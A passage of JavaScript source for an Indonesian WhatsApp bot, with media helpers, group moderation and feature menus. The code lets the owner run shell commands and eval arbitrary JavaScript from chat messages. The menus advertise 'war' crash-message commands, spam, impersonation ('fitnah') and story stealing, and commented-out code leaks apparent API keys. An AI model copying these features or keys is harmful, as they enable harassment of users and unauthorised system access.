                    quoted: fgi
                })
                giie.relayWAMessage(prep)
                                }
                            }
                        }
                    }
                }
            }
        }
        const sendStickerUrl = async (to, url) => {
            console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))
            var names = getRandom('.webp')
            var namea = getRandom('.png')
            var download = function(uri, filename, callback) {
                request.head(uri, function(err, res, body) {
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                });
            };
            download(url, namea, async function() {
                let filess = namea
                let asw = names
                require('./lib/exif.js')
                exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                    exec(`webpmux -set exif ./temp/data.exif ${asw} -o ${asw}`, async (error) => {
                        let media = fs.readFileSync(asw)
                        giie.sendMessage(to, media, sticker)
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                        console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
                    });
                });
            });
        }
        const sendWebp = async (from, url) => {
            var names = Date.now() / 10000;
            var download = function(uri, filename, callback) {
                request.head(uri, function(err, res, body) {
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                });
            };
            download(url, './temp' + names + '.png', async function() {
                console.log('selesai');
                let ajg = './temp' + names + '.png'
                let palak = './temp' + names + '.webp'
                exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                    let media = fs.readFileSync(palak)
                    giie.sendMessage(from, media, MessageType.sticker)
                    fs.unlinkSync(ajg)
                    fs.unlinkSync(palak)
                });
            });
        }
        const sendKontak = (from, nomor, nama) => {
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
            giie.sendMessage(from, {
                displayname: nama,
                vcard: vcard
            }, MessageType.contact, {
                quoted: fgi,
                contextInfo: {
                    forwardingScore: 508,
                    isForwarded: true
                }
            })
        }
        const hideTagKontak = async function(from, nomor, nama) {
            let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
            let anu = await giie.groupMetadata(from)
            let members = anu.participants
            let ane = []
            for (let i of members) {
                ane.push(i.jid)
            }
            giie.sendMessage(from, {
                displayname: nama,
                vcard: vcard
            }, MessageType.contact, {
                contextInfo: {
                    "mentionedJid": ane
                }
            })
        }
        const reply = (teks) => {
            giie.sendMessage(from, teks, text, {
                quoted: mek
            })
        }
        const simir = (teks) => {
            giie.sendMessage(from, teks, text, {
                quoted: fgi
            })
        }
        const math = (teks) => {
            return Math.floor(teks)
        }
        const sendMess = (hehe, teks) => {
            giie.sendMessage(hehe, teks, text, {
                quoted: ftok,
                contextInfo: {
                    forwardingScore: 508,
                    isForwarded: true
                }
            })
        }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? giie.sendMessage(from, teks.trim(), extendedText, {
                contextInfo: {
                    "mentionedJid": memberr
                }
            }): giie.sendMessage(from, teks.trim(), extendedText, {
                quoted: mek,
                contextInfo: {
                    "mentionedJid": memberr
                }
            })
        }
        const sendFileFromUrl = async (link, type, options) => {
            hasil = await getBuffer(link)
            giie.sendMessage(from, hasil, type, options).catch(e => {
                fetch(link).then((hasil) => {
                    giie.sendMessage(from, hasil, type, options).catch(e => {
                        giie.sendMessage(from, {
                            url: link
                        }, type, options).catch(e => {
                            reply
                            console.log(e)
                        })
                    })
                })
            })
        }
        const sendMediaURL = async (to, url, text = "", mids = []) => {
            if (mids.length > 0) {
                text = normalizeMention(to, text, mids)
            }
            const fn = Date.now() / 10000;
            const filename = fn.toString()
            let mime = ""
            var download = function(uri, filename, callback) {
                request.head(uri, function(err, res, body) {
                    mime = res.headers['content-type']
                    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                });
            };
            download(url, filename, async function() {
                console.log('done');
                let media = fs.readFileSync(filename)
                let type = mime.split("/")[0] + "Message"
                if (mime === "image/gif") {
                    type = MessageType.video
                    mime = Mimetype.gif
                }
                if (mime.split("/")[0] === "audio") {
                    mime = Mimetype.mp4Audio
                }
                giie.sendMessage(to, media, type, {
                    quoted: mek,
                    mimetype: mime,
                    caption: text,
                    contextInfo: {
                        "mentionedJid": mids
                    }
                })

                fs.unlinkSync(filename)
            });
        }
        const sendFakeThumb = async function(from, url, title, desc) {
            var anoim = {
                detectLinks: false
            }
            var qul = await giie.generateLinkPreview(url)
            qul.title = title
            qul.description = desc
            qul.jpegThumbnail = dfrply
            giie.sendMessage(from, qul, MessageType.extendedText, anoim)
        }

        function Json(objectPromise) {
            var objectString = JSON.stringify(objectPromise, null, 2)
            var parse = util.format(objectString)
            if (objectString == undefined) {
                parse = util.format(objectPromise)
            }
            return reply(parse)
        }

        function speedText(speed) {
            let bits = speed * 8;
            const units = ['', 'K', 'M', 'G', 'T'];
            const places = [0, 1, 2, 3];
            let unit = 0;
            while (bits >= 2000 && unit < 4) {
                unit++;
                bits /= 1000;
            }
            return `${bits.toFixed(places[unit])} ${units[unit]}bps`;
        }
        if (budy.startsWith('>')) {
            if (!isOwner) return reply(`Perintah ini tidak bisa Di lakukan oleh Jadibot sementara`)
            console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Eval V1 brooo`))
            ras = budy.slice(1)

            function _(rem) {
                ren = JSON.stringify(rem, null, 2)
                pes = util.format(ren)
                reply(pes)
            }
            try {
                c
                reply(require('util').format(eval(`(async () => { ${ras} })()`)))
            } catch (err) {
                e = String(err)
                reply(e)
            }
        }
        if (budy.startsWith('$')) {
            if (!mek.key.fromMe && !isOwner) return
            qur = budy.slice(2)
            exec(qur, (err, stdout) => {
                if (err) return reply(`${err}`)
                if (stdout) {
                    reply(stdout)
                }
            })
        }
        if (budy.startsWith('x')) {
            if (!mek.key.fromMe && !isOwner) return
            try {
                return giie.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, {
                    quoted: mek
                })
            } catch (err) {
                e = String(err)
                reply(e)
            }
        }
        if (budy.startsWith('=>')) {
            if (!isOwner && !mek.key.fromMe) return
            var konsol = budy.slice(3)
            Return = (sul) => {
                var sat = JSON.stringify(sul, null, 2)
                bang = util.format(sat)
                if (sat == undefined) {
                    bang = util.format(sul)
                }
                return reply(bang)
            }
            try {
                reply(util.format(eval(`;(async () => { ${konsol} })()`)))
                console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
            } catch (e) {
                reply(String(e))
            }
        }
        // AUTO
        for (let anji of setik) {
            if (budy === anji) {
                result = fs.readFileSync(`./media/sticker/${anji}.webp`)
                giie.sendMessage(from, result, sticker, {
                    quoted: mek,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true
                    }
                })
            }
        }
        for (let anju of vien) {
            if (budy === anju) {
                result = fs.readFileSync(`./media/vn/${anju}.mp3`)
                giie.sendMessage(from, result, audio, {
                    mimetype: 'audio/mp4',
                    duration: 359996400,
                    ptt: true,
                    quoted: mek,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true
                    }
                })
            }
        }
        for (let anjh of imagi) {
            if (budy === anjh) {
                result = fs.readFileSync(`./media/image/${anjh}.jpg`)
                giie.sendMessage(from, result, image, {
                    quoted: mek,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true
                    }
                })
            }
        }
        for (var i = 0; i < commandsDB.length; i++) {
            if (budy.toLowerCase() === commandsDB[i].pesan) {
                reply(commandsDB[i].balasan)
            }
        }
        // MUTE
        //var oneImage = 0; var oneLink = 0; var oneTrava = 0; var i//sTyping =[];
        //  var imgbb = require('imgbb-uploader')
        // if (isGroup && !isGroupAdmins && isBotGroupAdmins && isMedia && isAntiPorn && !mek.message.videoMessage || isQuotedImage) {
        // try {
        //    oneImage = 1; console.log(color('[IMAGEM]', 'red'), color('Verifikasi Porno...', 'yellow'))
        //   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
        //  const encmedia = mek
        //  owgi = await  giie.downloadAndSaveMediaMessage(encmedia)
        //anu = await imgbb("62194adab0f03a94b2f2605e5258ce17", owgi)
        //teks = `${anu.display_url}`
        //deepai.setApiKey('efb61b63-3506-4a7f-b4f0-5ae3640cf3b5');
        //  const resp = await deepai.callStandardApi("nsfw-detector", { image: `${teks}` })
        //  if (resp.output.nsfw_score > 0.85) {
        //  giie.groupRemove(from, [kic]).catch((e) => { reply(mess.only.Badmin) })
        //    console.log(color('[NSFW]', 'red'), color(`A imagem contém traços de`, 'yellow'));return oneImage = 0
        //      } else { console.log(color('[SEM NSFW]', 'lime'), color(`→ A imagem não parece ser pornográfica.`, 'gold'));oneImage = 0 }
        //   } catch (error) { return oneImage = 0 }
        // }
        
     // MUTE ===========================
     
        if (isMuted) {
            if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return
            if (budy.toLowerCase().startsWith(`${prefix}unmute`)) {
                let anu = mute.indexOf(from)
                mute.splice(anu, 1)
                fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
                reply('Bot telah diunmute di group ini')
            }
        }
        // ANTILINK=====================================
        
        if (budy.includes("https://chat.whatsapp.com/")) {
            if (!mek.key.fromMe) {
                if (!isGroup) return
                if (!isAntiLink) return
                if (isGroupAdmins) return fakegroup('Dia Pejabat Group ! *BEBAS*')
                giie.updatePresence(from, Presence.composing)
                var kic = `${sender.split("@")[0]}@s.whatsapp.net`
                giie.groupRemove(from, [kic]).catch((e) => {
                    reply(mess.only.Badmin)
                })
                reply('PROMOTE GROUP DETECTED ! *Auto Kick!*')
            }
        }
        //  ANTIBADWORD===============================
        
        if (bad.includes(messagesD)) {
            if (!mek.key.fromMe) {
                if (!isGroup) return
                if (!isBadword) return
                if (isGroupAdmins) return fakegroup('Dia Pejabat Group ! *BEBAS*')
                giie.updatePresence(from, Presence.composing)
                var kic = `${sender.split("@")[0]}@s.whatsapp.net`
                giie.groupRemove(from, [kic]).catch((e) => {
                    reply(mess.only.Badmin)
                })
                reply('_Jangan Toxic !_')
            }
        }
        if (m.message && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
            m.reply('Troli Detected\n\n' + require('util').format(m.key))
            await giie.modifyChat(m.chat, 'delete', {
                includeStarred: false
            })
        }
        
// AUTOREAD/KETIK/VN==============================

        var chatss = await giie.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
        chatss.map(async ({
            jid
        }) => {
            if (readPc === false) return
            await giie.chatRead(jid)
        })
        if (autovn) {
            if (autovn === false) return
            await giie.updatePresence(from, Presence.recording)
        } else if (autoketik) {
            if (autoketik === false) return
            await giie.updatePresence(from, Presence.composing)
        }
        const sotoy = [
            '🏀 : 🏐 : 🥎',
            '🥎 : 🏐 : 🏐',
            '🥎 : 🏀 : 🥎',
            '⚽ : ⚽ : 🥎', //ANKER
            '⚾ : ⚽ : 🏀',
            '🥎 : 🏀 : ⚾',
            '⚾ : ⚾ : ⚽',
            '🏀 : ⚽ : ⚽',
            '🥎 : ⚽ : 🏀',
            '⚽ : 🏀 : 🏀',
            '⚾ : 🥎 : ⚽',
            '⚾ : 🏐 : 🏀',
            '🥎 : ⚽ : 🏐',
            '🏀 : ⚽ : 🥎',
            '⚽ : ⚽ : ⚽ You Win🎉',
            '⚾ : ⚾ : 🥎',
            '🏀 : ⚽ : 🏐',
            '⚾ : 🏐 : 🏀',
            '🥎 : ⚽ : 🏐',
            '🏀 : ⚽ : 🥎',
            '🏀 : 🏀 : 🏀 You Win🎉',
            '⚾ : ⚾ : 🥎',
            '🏀 : ⚽ : 🏐',
            '🏐 : 🏐 : ⚾',
            '⚾ : 🏐 : 🏀',
            '🥎 : ⚽ : 🏐',
            '🏀 : ⚽ : 🥎',
            '🥎 : 🥎 : 🥎 You Win🎉',
            '⚾ : ⚾ : 🥎',
            '🏀 : ⚽ : 🏐',
            '🏐 : 🏐 : ⚾',
            '⚾ : 🏐 : 🏀',
            '🥎 : ⚽ : 🏐',
            '🏀 : ⚽ : 🥎',
            '⚾ : ⚾ : ⚾ You Win🎉',
            '⚾ : ⚾ : 🥎',
            '🏀 : ⚽ : 🏐',
            '🏐 : 🏐 : ⚾',
            '⚾ : 🏐 : 🏀',
            '🥎 : ⚽ : 🏐',
            '🏀 : ⚽ : 🥎',
            '🏀 : ?? : 🏀 You Win🎉',
            '⚾ : ⚾ : 🥎',
            '🏀 : ⚽ : 🏐',
            '🏐 : 🏐 : ⚾',
            '🏐 : 🏐 : 🏐 You Win🎉'
        ]

        const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
        const isStcVideo = isStcMedia && content.includes("videoMessage")
        const isStcImage = isStcMedia && content.includes("imageMessage")
        const isStcSticker = isStcMedia && content.includes("stickerMessage")
        const isStcTeks = isStcMedia && content.includes("quotedMessage")
        const isStcDocs = isStcMedia && content.includes("documentMessage")
        const isStcContact = isStcMedia && content.includes("contactMessage")
        const isStcAudio = isStcMedia && content.includes("audioMessage")
        const isStcLoca = isStcMedia && content.includes("locationMessage")
        const isStcTag = isStcMedia && content.includes("mentionedJid")
        const isStcReply = isStcMedia && content.includes("Message")
        const isStcProd = isStcMedia && content.includes("productMessage")
        if (!publik) {
            if (!isOwner && !mek.key.fromMe) return
        }
        if (isCmd && !isGroup) {
            console.log(color('|CMD|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(`${command} [${args.length}]`, 'cyan'), color(`${pushname}`, 'green'), color(`${sender}`, 'deeppink'))
        }
        if (!command) {
            console.log(color('|MSG|', 'greenyellow'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'blue'), color(cmd, 'cyan'), color(`${pushname}`, 'green'), color(`${sender}`, 'deeppink'))
        }

        switch (isStc) {
            case '5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf':
                if (!isStcSticker) return reply('Reply stickernya bgsd!')
                su = mek.message.stickerMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('hex')
                reply(su)
        }
        switch (command) {
            case 'menu':
            case 'help':
                ganz = fs.readFileSync("./media/image/gio.jpeg");
                runtime = process.uptime()
                ptod = "0@s.whatsapp.net"
                stod = `${sender}`
                uwu = '```'
                stst = await giie.getStatus(`${sender.split('@')[0]}@c.us`)
                stst = stst.status == 401 ? '' : stst.status
                menu = `*_➪ Notice :_*
_-Dilarang keras untuk spam feature (tag all, hidetag, virtex, attp) ☞︎︎︎Auto Banned_
_-Ketik manual jika button dibawah tidak berfungsi (.command / .allmenu)_
_-save wa creator / owner , beritahu creator bila terjadi error_

☕︎ Powered by: *Ayogi Akbar*
_[ JavaScript Source Developer ]_

*❍ BOT INFO*
- Creator : AyogiAk
- Battery : ${baterai.battery}
- Mode : ${publik ? 'Public' : 'Self'}

_𖠌 Bot telah on selama : ${waktu(runtime)}_

*❍ TIME INFO*
- User : ${tampilUcapan} ${pushname}
- Time : ${timeWib}
- Day : ${week}
- Date : ${calender}

Support by: gionova&exsala☕︎`
                sendButLocation(from, `*GionexsaBots | JavaScript Code* \n_( If we never try, we will never know )_`, `${menu}`, {
                    jpegThumbnail: ganz
                }, [{
                    buttonId: `allmenu`,
                    buttonText: {
                        displayText: 'All Feature︎'
                    },
                    type: 1
                }, {
                    buttonId: `command`,
                    buttonText: {
                        displayText: 'List Menu'
                    },
                    type: 1
                }, {
                    buttonId: `giie`,
                    buttonText: {
                        displayText: 'Developer | Creator'
                    },
                    type: 1
                }], {
                    contextInfo: {
                        mentionedJid: [ptod]
                    }
                })
                break

            case 'allmenu':
                ptod = "6289654560615@s.whatsapp.net"
                stod = `${sender}`
                uwu = '```'
                stst = await giie.getStatus(`${sender.split('@')[0]}@c.us`)
                nama = 'AyogiAk'
                ownerJid = "6289654560615@s.whatsapp.net"
                stst = stst.status == 401 ? '' : stst.status
                menu = ` *❍ BOT INFO*
- Creator : ${nama}
- Battery : ${baterai.battery}
- Mode : ${publik ? 'Public' : 'Self'}
- Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}
- Nomor Creator : @${otod.split('@')[0]}
- Auto Com : ${settings.autocomposing}
- Auto Rec : ${settings.autorecording}

*❍ USER INFO*
- Status : ${isOwner ? 'Owner' : 'User'}
- Name : ${pushname}
- Biodata : ${stst}
- Nomor : @${stod.split('@')[0]}

𖦹 ${jmn} ${week} ${calender}

*❍ ALL MENU*

*Feature Owner :*
➪ ${prefix}autorespon [ on/off ]
➪ ${prefix}bc [ teks/reply gif/image/video with caption ]
➪ ${prefix}tobc [ reply sticker/audio with caption ]
➪ ${prefix}return [ javascript ]
➪ ${prefix}clearall
➪ ${prefix}readall
➪ ${prefix}delchat
➪ ${prefix}mute
➪ ${prefix}unmute
➪ ${prefix}public
➪ ${prefix}self
➪ ${prefix}colongsw [ reply story ]
➪ ${prefix}spam [ teks|jumlah ]
➪ ${prefix}demoteall
➪ ${prefix}promoteall
➪ ${prefix}tohidetag [id group]
➪ ${prefix}remotehidetagtext [id group]
➪ ${prefix}addcmd [ teks reply stc ]
➪ ${prefix}delcmd [ reply stc ]
➪ ${prefix}listcmd
➪ ${prefix}spamsw [ teks|jumlah ]
➪ ${prefix}upswteks [ teks ]
➪ ${prefix}upswlokasi [ teks ]
➪ ${prefix}upswaudio [ reply audio ]
➪ ${prefix}upswvoice [ reply audio ]
➪ ${prefix}upswsticker [ reply sticker ]
➪ ${prefix}upswimage [ reply image with caption ]
➪ ${prefix}upswgif [ reply gif with caption ]
➪ ${prefix}upswvideo [ reply video with caption ]
➪ ${prefix}shutdown
➪ ${prefix}offline [ alasan ]
➪ ${prefix}online
➪ ${prefix}exif [ nama|author ]
➪ ${prefix}setprofile [ reply image ]
➪ ${prefix}setname [ teks ]
➪ ${prefix}setprefix [ multi/nopref ]
➪ ${prefix}setbio [ teks ]
➪ ${prefix}leave
➪ ${prefix}restart
➪ ${prefix}join [ link group ]
➪ ${prefix}addrespon [ tanya|jawab ]
➪ ${prefix}delrespon [ nama ]
➪ ${prefix}q [ reply message ]
➪ ${prefix}d [ reply message ]

*Feature Setting :*
➪ ${prefix}antilink
➪ ${prefix}badword
➪ ${prefix}antidelete
➪ ${prefix}nsfw
➪ ${prefix}welcome
➪ ${prefix}autosticker
➪ ${prefix}autoread
➪ ${prefix}autovn
➪ ${prefix}autoketik
➪ ${prefix}group
➪ ${prefix}mode
➪ ${prefix}setprefix
➪ ${prefix}setprofile [ reply image ]
➪ ${prefix}setname [ teks ]
➪ ${prefix}setbio [ teks ]

*Feature War :*
➪ ${prefix}virtex
➪ ${prefix}bugkatalog
➪ ${prefix}bugloc
➪ ${prefix}bugrow
➪ ${prefix}buglink
➪ ${prefix}bugbutton
➪ ${prefix}bug [ jumlah ]
➪ ${prefix}bugpc2 [ jumlah ]
➪ ${prefix}bugtroli2 [ jumlah ]
➪ ${prefix}bugtroli3
➪ ${prefix}bugpc
➪ ${prefix}bugcombine
➪ ${prefix}bugtroli
➪ ${prefix}buglokasi
➪ ${prefix}bughole

*Feature Stalking :*
➪ ${prefix}igstalk [username]tanpa@


*Feature Download :*
➪ ${prefix}infogempa
➪ ${prefix}herolist
➪ ${prefix}herodetail [ hero ]
➪ ${prefix}google [ search ]
➪ ${prefix}gimage [ search ]
➪ ${prefix}wiki [ search ]
➪ ${prefix}mediafire [ link ]
➪ ${prefix}ytsearch [ judul ]
➪ ${prefix}ytmp4 [ link yt ]
➪ ${prefix}ytmp3 [ link yt ]
➪ ${prefix}play [ judul lagu ]
➪ ${prefix}video [ judul video ]
➪ ${prefix}tinyurl [ link ]
➪ ${prefix}fetch [ link ]
➪ ${prefix}igdownload [ link ]
➪ ${prefix}tiktokdownload [ link ]
➪ ${prefix}pinterest [ search ]
➪ ${prefix}film [ judul ]
➪ ${prefix}lirik [ judul ]
➪ ${prefix}tourl [ reply image/video ]
➪ ${prefix}resepmasakan [ judul ]
➪ ${prefix}artimimpi [ teks ]
➪ ${prefix}spekhp [ type ]
➪ ${prefix}zodiak [ teks ]
➪ ${prefix}artinama [ teks ]
➪ ${prefix}jadwaltv [ station ]
➪ ${prefix}kalkulator [ angka ]
➪ ${prefix}fancytext [ teks ]
➪ ${prefix}githubstalk [ username ]
➪ ${prefix}ss [ link ]
➪ ${prefix}tiktokaudio [ link ]
➪ ${prefix}igstory [ link ]
➪ ${prefix}linkwa [nomor]
➪ ${prefix}carigc [nama]
➪ ${prefix}playstore [ query ]
➪ ${prefix}fb [ link ]
➪ ${prefix}twitter [ link ]

*Feature Maker Text :*
➪ ${prefix}tulis 「 text 」
➪ ${prefix}foliokiri 「 text 」
➪ ${prefix}foliokanan 「 text 」
➪ ${prefix}nuliskanan 「 text 」
➪ ${prefix}nuliskiri 「 text 」
➪ ${prefix}blackpink「 text 」
➪ ${prefix}graffiti「 text 」
➪ ${prefix}textpantai「 text 」
➪ ${prefix}watercolor「 text 」
➪ ${prefix}jokerlogo「 text 」
➪ ${prefix}thunder「 text 」
➪ ${prefix}breakwall「 text 」
➪ ${prefix}matrix [ teks ]
➪ ${prefix}wolflogo [ teks ]
➪ ${prefix}flower [ teks ]
➪ ${prefix}crosslogo [ teks ]
➪ ${prefix}silktext [ teks ]
➪ ${prefix}hartatahta [ teks ]
➪ ${prefix}breakwall [ teks ]
➪ ${prefix}dropwater [ teks ]
➪ ${prefix}gplaybutton [ teks ]
➪ ${prefix}brandlogo [ teks1|text2 ]
➪ ${prefix}pubg [ teks1|text2 ]
➪ ${prefix}glowtext [ teks ]
➪ ${prefix}text1 「 text 」
➪ ${prefix}text2 「 text 」
➪ ${prefix}text3 「 text 」
➪ ${prefix}text4 「 text 」
➪ ${prefix}text5 「 text 」
➪ ${prefix}text6 「 text 」
➪ ${prefix}text7 「 text 」
➪ ${prefix}text8 「 text 」
➪ ${prefix}googletxt 「 text1|text2|text3 」
➪ ${prefix}battlefield 「 text 」
➪ ${prefix}sertiff 「 text 」
➪ ${prefix}sertitolol「 text 」
➪ ${prefix}serti1 「 text 」
➪ ${prefix}serti2 「 text 」
➪ ${prefix}serti3 「 text 」
➪ ${prefix}coffeecup 「 text 」
➪ ${prefix}coffeecup2 「 text 」
➪ ${prefix}neon 「 text 」
➪ ${prefix}glow 「 text 」
➪ ${prefix}summer 「 text 」
➪ ${prefix}flower 「 text 」
➪ ${prefix}burn 「 text 」
➪ ${prefix}quote 「 text 」
➪ ${prefix}wooden 「 text 」
➪ ${prefix}golden 「 text 」

*Feature Maker Image :*
➪ ${prefix}trigger 「 image」
➪ ${prefix}pixelate 「 image 」
➪ ${prefix}horny 「 image 」
➪ ${prefix}simpcard 「 image 」
➪ ${prefix}blur 「 image 」
➪ ${prefix}wasted 「 image 」
➪ ${prefix}jail 「 image 」
➪ ${prefix}greyscale 「 image 」
➪ ${prefix}rainbow 「 image 」
➪ ${prefix}green 「 image 」
➪ ${prefix}red 「 image 」
➪ ${prefix}sepia 「 image 」
➪ ${prefix}calender 「 image 」

*Feature Groups :*
➪ ${prefix}getpict [ @tag ]
➪ ${prefix}getname [ reply target ]
➪ ${prefix}getbio [ reply target ]
➪ ${prefix}promote [ @tag ]
➪ ${prefix}demote [ @tag ]
➪ ${prefix}antilink [ on/off ]
➪ ${prefix}badword [ on/off ]
➪ ${prefix}antidelete [ on/off ]
➪ ${prefix}nsfw [ on/off ]
➪ ${prefix}welcome [ on/off ]
➪ ${prefix}autosticker [ on/off ]
➪ ${prefix}creategrup [ nama|@tag ]
➪ ${prefix}tictactoe [ @tag ]
➪ ${prefix}delttt
➪ ${prefix}getpp
➪ ${prefix}kick [ @tag ]
➪ ${prefix}add [ nomor ]
➪ ${prefix}getdeskgc
➪ ${prefix}sider [ reply pesan bot ]
➪ ${prefix}hacked [ teks ]
➪ ${prefix}setnamegc [ teks ]
➪ ${prefix}setdeskgc [ teks ]
➪ ${prefix}fitnah [ @tag|teks1|teks2 ]
➪ ${prefix}kontak [ @tag|nama ]
➪ ${prefix}kontag [ @tag|nama ]
➪ ${prefix}opengc
➪ ${prefix}closegc
➪ ${prefix}resetlinkgc
➪ ${prefix}linkgrup
➪ ${prefix}hidetag [ teks ]
➪ ${prefix}totag [ reply media ]

*Feature Nsfw :*
➪ ${prefix}trapnime
➪ ${prefix}neko
➪ ${prefix}megumin
➪ ${prefix}blowjob
➪ ${prefix}hentai
➪ ${prefix}awoo
➪ ${prefix}bj 
➪ ${prefix}eroneko
➪ ${prefix}lesbian
➪ ${prefix}anal
➪ ${prefix}yuri
➪ ${prefix}baka
➪ ${prefix}neko2
➪ ${prefix}wallpaperanime
➪ ${prefix}pussy
➪ ${prefix}kitsune
➪ ${prefix}keta
➪ ${prefix}neko2
➪ ${prefix}poke
➪ ${prefix}slap
➪ ${prefix}komiku [ query ]
➪ ${prefix}otaku [ query ]
➪ ${prefix}chara [ query ]

*Feature Tools :*
➪ ${prefix}getscmd
➪ ${prefix}stickmeme [ text ]
➪ ${prefix}stickerwm [ nama|author ]
➪ ${prefix}takestick [ nama|author ]
➪ ${prefix}colong [ reply sticker ]
➪ ${prefix}sticker
➪ ${prefix}semoji [ emoji ]
➪ ${prefix}attp [ teks ]
➪ ${prefix}ttp3d [ teks ]
➪ ${prefix}toimg
➪ ${prefix}trans [ kodebhs|kodebhs|teks ]
➪ ${prefix}translate
➪ ${prefix}vn [ reply video ]
➪ ${prefix}tomp3 [ reply video ]
➪ ${prefix}tomp4 [ reply sticker gif ]
➪ ${prefix}robot [ reply audio ]
➪ ${prefix}balik [ reply audio ]
➪ ${prefix}bass [ reply audio ]
➪ ${prefix}gemuk [ reply audio ]
➪ ${prefix}detikvn [ reply audio caption angka ]
➪ ${prefix}detikvideo [ reply video caption angka ]
➪ ${prefix}tts [ kodebhs teks ]

*Feature Storage :*
➪ ${prefix}addsticker [ nama ]
➪ ${prefix}delsticker [ nama ]
➪ ${prefix}addvn [ nama ]
➪ ${prefix}delvn [ nama ]
➪ ${prefix}addimage [ nama ]
➪ ${prefix}delimage [ nama ]
➪ ${prefix}listimage
➪ ${prefix}liststicker
➪ ${prefix}listvn

*Feature Create Bot :*
➪ ${prefix}stopjadibot
➪ ${prefix}jadibot

*Feature Fun :*
➪ ${prefix}caripesan [ teks|jumlah ]
➪ ${prefix}slots
➪ ${prefix}suit [ gunting/batu/kertas ]
➪ ${prefix}tag [ nomor ]
➪ ${prefix}tagme
➪ ${prefix}readmore [ teks1|teks2 ]
➪ ${prefix}fitnahpc [ nomor|teks1|teks2 ]
➪ ${prefix}chat [ nomor|teks ]
➪ ${prefix}fdeface [ replyimg link|teks1|teks2 ]
➪ ${prefix}listgrup
➪ ${prefix}baileys [ reply message ]
➪ ${prefix}getcaption [ reply message ]
➪ ${prefix}pantun
➪ ${prefix}quotes
➪ ${prefix}bijak
➪ ${prefix}fakta
➪ ${prefix}tospam [ reply audio/sticker/image|jumlah ]
➪ ${prefix}sharelock [ teks1|teks2 ]
➪ ${prefix}dadu

_ini dulu feature nya, kalo ada waktu luang saya akan isi dengan yg lebih menarik lagi_\n*I hope the features above can make you happy*
*_Developer by: AyogiAk|JavaScript_*`
                giie.sendMessage(from, menu, text, {
                    quoted: fgi,
                    thumbnail: fs.readFileSync('./gio.jpg'),
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true,
                        externalAdReply: {
                            title: `${jmn} - ${week} ${weton} - ${calender}`,
                            body: "",
                            mediaType: "2",
                            thumbnail: ofrply,
                            mediaUrl: `https://www.instagram.com/p/CUikuHyhvVp/?utm_medium=copy_link`
                        }
                    }
                })
                break
            case 'command':
                ptod = "6289654560615@s.whatsapp.net"
                stod = `${sender}`
                uwu = '```'
                stst = await giie.getStatus(`${sender.split('@')[0]}@c.us`)
                stst = stst.status == 401 ? '' : stst.status
                listMsg = {
                    buttonText: 'List Feature',
                    footerText: '*Developer by: AyogiAk | JavaScript*',
                    description: `_Haloo @${stod.split('@')[0]}_ 🙋\n_Silahkan Click_ *_List Feature_* _lalu pilih feature yang ingin kamu gunakan_`,
                    sections: [{
                        "title": `GionovaXEcha ${jmn} - ${week} - ${calender}`,
                        rows: [{
                                "title": "Creator",
                                "rowId": ""
                            },
                            {
                                "title": "Status",
                                "rowId": ""
                            },
                            {
                                "title": "Speed",
                                "rowId": ""
                            },
                            {
                                "title": "Translate",
                                "rowId": ""
                            },
                            {
                                "title": "BotMenu",
                                "rowId": ""
                            },
                            {
                                "title": "SettingMenu",
                                "rowId": ""
                            },
                            {
                                "title": "OwnerMenu",
                                "rowId": ""
                            },
                            {
                                "title": "MakerMenu",
                                "rowId": ""
                            },
                            {
                                "title": "GroupMenu",
                                "rowId": ""
                            },
                            {
                                "title": "NsfwMenu",
                                "rowId": ""
                            },
                            {
                                "title": "OtherMenu",
                                "rowId": ""
                            },
                            {
                                "title": "FunMenu",
                                "rowId": ""
                            },
                            {
                                "title": "BugMenu",
                                "rowId": ""
                            },
                            {
                                "title": "StorageMenu",
                                "rowId": ""
                            },
                            {
                                "title": "DownloadMenu",
                                "rowId": ""
                            },
                            {
                                "title": "StalkingMenu",
